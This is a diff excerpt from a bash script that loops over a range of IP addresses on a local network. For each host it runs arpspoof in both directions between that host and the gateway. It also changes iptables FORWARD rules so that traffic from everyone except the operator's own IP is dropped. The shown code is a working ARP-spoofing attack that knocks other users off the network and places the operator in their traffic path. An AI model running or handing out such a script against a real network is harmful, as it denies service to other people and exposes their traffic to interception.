@@ -40,12 +40,10 @@ for (( i = MIN; i <= MAX; i++ )); do
     IP=$(dec2ip "$i")
 
 # Drop all the packets except your IP source and destination (bidirectional)
-iptables -I FORWARD -s "$MYIP" -d "$GATEWAY" -j ACCEPT
-iptables -I FORWARD -s "$GATEWAY" -d "$MYIP" -j ACCEPT
-iptables -I FORWARD -j DROP
-iptables -t nat -A PREROUTING -s "$MYIP" -j DNAT --to-destination "$GATEWAY"
-   
-# Spoofing all the users ARP
+iptables -I FORWARD ! -s "$MYIP" -d "$GATEWAY" -j DROP
+iptables -I FORWARD ! -s "$GATEWAY" -d "$MYIP" -j DROP
+
+# Bidirectional Arp Spoofing policy
 arpspoof -i "$INTERFACE" -t "$IP" "$GATEWAY" >/dev/null 2>&1 &
 arpspoof -i "$INTERFACE" -t "$GATEWAY" "$IP" >/dev/null 2>&1 &
 
